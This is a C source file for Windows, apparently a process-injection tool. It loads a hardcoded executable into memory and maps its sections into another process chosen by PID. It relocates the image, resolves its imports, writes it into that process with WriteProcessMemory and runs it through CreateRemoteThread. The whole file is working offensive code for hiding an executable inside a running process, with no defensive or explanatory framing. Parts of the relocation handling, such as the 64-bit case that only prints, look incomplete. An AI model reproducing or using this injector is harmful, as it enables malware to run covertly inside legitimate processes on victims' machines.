#include <stdio.h>
#include <windows.h>

int GetFileBuffer(LPWSTR path);
HANDLE hPE_File, hFileMapping;
LPVOID pFileBuffer;

void GetRemoteProcMem(ULONG procPid);
LPVOID lpRemoteMem;
HANDLE targetProcess;

typedef BOOL(WINAPI *Type_DllMain)(HMODULE, DWORD, LPVOID);
void MapPEIntoProcMem();
LPVOID lpBase;
ULONG sizeOfImage;
Type_DllMain entryPoint;

void RelocatePE();

void ResolveIAT();

void Clean();

int main(int argc, char* argv[])
{
	if (argc != 2) {
		printf("\nUsage: %s [PID]\n\n", argv[0]);
		return 1;
	}
	ULONG pid = strtoul(argv[1], NULL, 0);
	LoadLibrary(L"USER32.dll");
	LoadLibrary(L"ADVAPI32.dll");
	LPWSTR injectedEXEName = L"dmkj.exe";
	if (0 == GetFileBuffer(injectedEXEName)) {
		GetRemoteProcMem(pid);
		MapPEIntoProcMem();
		RelocatePE();
		ResolveIAT();
		if (!WriteProcessMemory(targetProcess, lpRemoteMem, lpBase, sizeOfImage, NULL)) {
			printf("Error: unable to write process memory (%u)\n", GetLastError());
		}
		else {
			HANDLE newThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
			if (!newThread) {
				printf("Unable to create remote thread in target process: (%u)\n", GetLastError());
			}
			else {
				printf("waiting for the thread to terminate...\n");
				WaitForSingleObject(newThread, INFINITE);

				printf("Thread terminated\n");
				CloseHandle(newThread);
				newThread = NULL;
			}
		}
	}
	Clean();
}

int GetFileBuffer(LPWSTR path)
{
	hPE_File = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (INVALID_HANDLE_VALUE == hPE_File || NULL == hPE_File) {
		printf("Failed to open the file: %ls\r\n", path);
		return -1;
	}

	hFileMapping = CreateFileMappingW(hPE_File, 0, PAGE_READONLY, 0, 0, NULL);
	if (NULL == hFileMapping) {
		CloseHandle(hPE_File);
		hPE_File = NULL;
		printf("Failed to create file mapping.\r\n");
		return -1;
	}

	pFileBuffer = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (NULL == pFileBuffer) {
		CloseHandle(hFileMapping);
		CloseHandle(hPE_File);
		hFileMapping = NULL;
		hPE_File = NULL;
		printf("Failed to map view of the file.\r\n");
		return -1;
	}

	return 0;
}

void GetRemoteProcMem(ULONG procPid)
{
	targetProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
		FALSE,
		procPid);
	if (!targetProcess) {
		printf("Unable to open process: (%u)\n", GetLastError());
		return;
	}

	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)(pFileBuffer);
	PIMAGE_NT_HEADERS pImageNtHeader = (PIMAGE_NT_HEADERS)((PUCHAR)pFileBuffer + pImageDosHeader->e_lfanew);
	UINT numberOfSections = pImageNtHeader->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pImageNtHeader + sizeof(IMAGE_NT_HEADERS));

	DWORD LEAST_SIZE = pImageSectionHeader[numberOfSections - 1].VirtualAddress + pImageSectionHeader[numberOfSections - 1].SizeOfRawData;

	printf("allocating memory in the target process\n");
	lpRemoteMem = VirtualAllocEx(targetProcess, NULL, LEAST_SIZE,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteMem) {
		printf("Unable to allocate memory in the target process: (%u)\n", GetLastError());
		CloseHandle(targetProcess);
		targetProcess = NULL;
		Clean();
		exit(-1);
	}
	printf("lpRemoteMem address is: %#x\n", lpRemoteMem);
}

void MapPEIntoProcMem()
{
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)(pFileBuffer);
	PIMAGE_NT_HEADERS pImageNtHeader = (PIMAGE_NT_HEADERS)((PUCHAR)pFileBuffer+pImageDosHeader->e_lfanew);
	sizeOfImage = pImageNtHeader->OptionalHeader.SizeOfImage;
	UINT numberOfSections = pImageNtHeader->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pImageNtHeader + sizeof(IMAGE_NT_HEADERS));
	entryPoint = (Type_DllMain)((PBYTE)lpRemoteMem+pImageNtHeader->OptionalHeader.AddressOfEntryPoint);
	
	DWORD LEAST_SIZE = pImageSectionHeader[numberOfSections-1].VirtualAddress + pImageSectionHeader[numberOfSections - 1].SizeOfRawData;

	lpBase = VirtualAlloc(NULL, LEAST_SIZE, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (NULL == lpBase) {
		printf("alloc failed\n");
		return;
	}
	printf("lpBase is : %#x\n", lpBase);
	
	LPVOID lpPEHeader = VirtualAlloc(lpBase, pImageNtHeader->OptionalHeader.SizeOfHeaders, MEM_COMMIT, PAGE_READWRITE);

	memcpy(lpPEHeader, pFileBuffer, pImageNtHeader->OptionalHeader.SizeOfHeaders);
	pImageDosHeader = (PIMAGE_DOS_HEADER)lpPEHeader;
	pImageNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pImageDosHeader + pImageDosHeader->e_lfanew);
	pImageSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pImageNtHeader + sizeof(IMAGE_NT_HEADERS));

	LPVOID pSectionBase = NULL;
	LPVOID pDest = NULL;
	for (int i = 0; i < numberOfSections; i++){
		if (0 != pImageSectionHeader[i].VirtualAddress) {
			pSectionBase = (LPVOID)((PBYTE)lpBase + pImageSectionHeader[i].VirtualAddress);
			DWORD size = 0;
			if (0 == pImageSectionHeader[i].SizeOfRawData) {
				if (pImageSectionHeader[i].Misc.VirtualSize > 0) {
					size = pImageSectionHeader[i].Misc.VirtualSize;
				}
				else {
					size = pImageNtHeader->OptionalHeader.SectionAlignment;
				}

				if (size > 0) {
					pDest = VirtualAlloc(pSectionBase, size, MEM_COMMIT, PAGE_READWRITE);
					if (NULL == pDest) {
						printf("section VirtualAlloc failed\n");
						return;
					}
					memset(pDest, 0, size);
				}
			}
			else {
				pDest = VirtualAlloc(pSectionBase, pImageSectionHeader[i].SizeOfRawData, MEM_COMMIT, PAGE_READWRITE);
				if (NULL == pDest) {
					printf("section VirtualAlloc failed 2\n");
					return;
				}
				memcpy(pDest, (LPVOID)((PBYTE)pFileBuffer + pImageSectionHeader[i].PointerToRawData), pImageSectionHeader[i].SizeOfRawData);
			}
			pImageSectionHeader[i].Misc.PhysicalAddress = (DWORD)(ULONGLONG)pDest;
		}
	}
}

void RelocatePE() 
{
	if (NULL == lpBase) {
		return;
	}
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)(lpBase);
	PIMAGE_NT_HEADERS pImageNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pImageDosHeader + pImageDosHeader->e_lfanew);

	LONGLONG lBaseDelta = (PBYTE)lpRemoteMem - (PBYTE)pImageNtHeader->OptionalHeader.ImageBase;
	if (0 == lBaseDelta) {
		printf("no need to relocate\n");
		return;
	}
	printf("the lBaseDelta is: %#x\n", lBaseDelta);

	if (0 == pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress ||
		0 == pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
		printf("the reloc section is empty\n");
		return;
	}

	PIMAGE_BASE_RELOCATION pImageBaseReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)lpBase +
		pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	if (NULL == pImageBaseReloc) {
		printf("invalid pImageBaseReloc\n");
		return;
	}
	printf("the reloc address is : %#x\n", pImageBaseReloc);

	while (pImageBaseReloc->SizeOfBlock) {
		int numberOfRelocData = (pImageBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		if (numberOfRelocData) {
			PWORD pRelocDatas = (PWORD)((PBYTE)pImageBaseReloc + sizeof(IMAGE_BASE_RELOCATION));

			PDWORD pAddress = NULL;
			for (int i = 0; i < numberOfRelocData; i++) {

				pAddress = (PDWORD)((PBYTE)lpBase + pImageBaseReloc->VirtualAddress + (pRelocDatas[i] & 0x0fff));
				// printf("reloc: before %#x\n", *pAddress);
				switch ((pRelocDatas[i] >> 12))
				{
				case IMAGE_REL_BASED_HIGHLOW:
					*pAddress += (DWORD)lBaseDelta;
					break;
				case IMAGE_REL_BASED_DIR64:
					printf("this is 64\n");
					break;
				case IMAGE_REL_BASED_HIGH:
					*pAddress += HIWORD(lBaseDelta);
					break;
				case IMAGE_REL_BASED_LOW:
					*pAddress += LOWORD(lBaseDelta);
					break;
				}
				// printf("reloc: after %#x\n", *pAddress);
			}
		}

		pImageBaseReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pImageBaseReloc + pImageBaseReloc->SizeOfBlock);
	}
}

void ResolveIAT()
{
	if (NULL == lpBase) {
		return;
	}
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)(lpBase);
	PIMAGE_NT_HEADERS pImageNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pImageDosHeader + pImageDosHeader->e_lfanew);

	if (0 == pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size ||
		0 == pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress) {
		printf("the IAT table is empty\n");
		return;
	}

	PIMAGE_IMPORT_DESCRIPTOR pImageImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)lpBase+
		pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	for (;pImageImportDesc->Name; pImageImportDesc++){
		PCHAR pDllName = (PCHAR)((PBYTE)lpBase + pImageImportDesc->Name);
		HMODULE hMod = GetModuleHandleA(pDllName);
		if (NULL == hMod) {
			printf("there is unloaded module: %s\n", pDllName);
			return;
		}

		PIMAGE_THUNK_DATA pOriginalThunk = NULL;
		if (pImageImportDesc->OriginalFirstThunk) {
			pOriginalThunk = (PIMAGE_THUNK_DATA)((PBYTE)lpBase + pImageImportDesc->OriginalFirstThunk);
		}
		else {
			pOriginalThunk = (PIMAGE_THUNK_DATA)((PBYTE)lpBase + pImageImportDesc->FirstThunk);
		}

		PIMAGE_THUNK_DATA pIATThunk = (PIMAGE_THUNK_DATA)((PBYTE)lpBase + pImageImportDesc->FirstThunk);
		for (;pOriginalThunk->u1.AddressOfData;pOriginalThunk++,pIATThunk++){
			FARPROC lpFunction = NULL;
			if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal)) {
				lpFunction = GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
			}
			else {
				PIMAGE_IMPORT_BY_NAME pImageImportByName =
					(PIMAGE_IMPORT_BY_NAME)((PBYTE)lpBase+pOriginalThunk->u1.AddressOfData);

				lpFunction = GetProcAddress(hMod, (LPCSTR) & (pImageImportByName->Name));
			}

			// Write into IAT
#ifdef _WIN64
			pIATThunk->u1.Function = (ULONGLONG)lpFunction;
#else
			pIATThunk->u1.Function = (DWORD)lpFunction;
#endif
		}
	}
}

void Clean()
{
	if (pFileBuffer) {
		UnmapViewOfFile(pFileBuffer);
		pFileBuffer = NULL;
	}

	if (hFileMapping) {
		CloseHandle(hFileMapping);
		hFileMapping = NULL;
	}

	if (hPE_File) {
		CloseHandle(hPE_File);
		hPE_File = NULL;
	}

	if (lpBase) {
		VirtualFree(lpBase, 0, MEM_RELEASE);
		lpBase = NULL;
	}

	if (lpRemoteMem) {
		VirtualFreeEx(targetProcess, lpRemoteMem, 0, MEM_RELEASE);
		CloseHandle(targetProcess);
		targetProcess = NULL;
		lpRemoteMem = NULL;
	}
}